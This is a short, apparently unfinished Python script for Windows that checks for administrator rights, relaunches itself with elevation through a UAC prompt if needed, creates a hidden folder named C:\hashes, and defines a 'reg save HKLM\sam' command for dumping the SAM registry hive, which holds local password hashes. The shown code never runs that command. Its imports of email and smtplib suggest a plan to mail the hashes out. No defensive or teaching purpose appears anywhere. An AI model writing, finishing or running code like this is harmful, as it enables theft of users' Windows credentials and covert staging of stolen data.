import email
import smtplib
import time
import os
import ctypes
import sys

#variables
folder_path = 'C:\\hashes'
cmd = 'reg save HKLM\sam ./hash.save '


def is_Admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
if is_Admin():
    os.makedirs(folder_path, exist_ok=True)
    os.system(f'attrib +h {folder_path}')
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)

is_Admin()

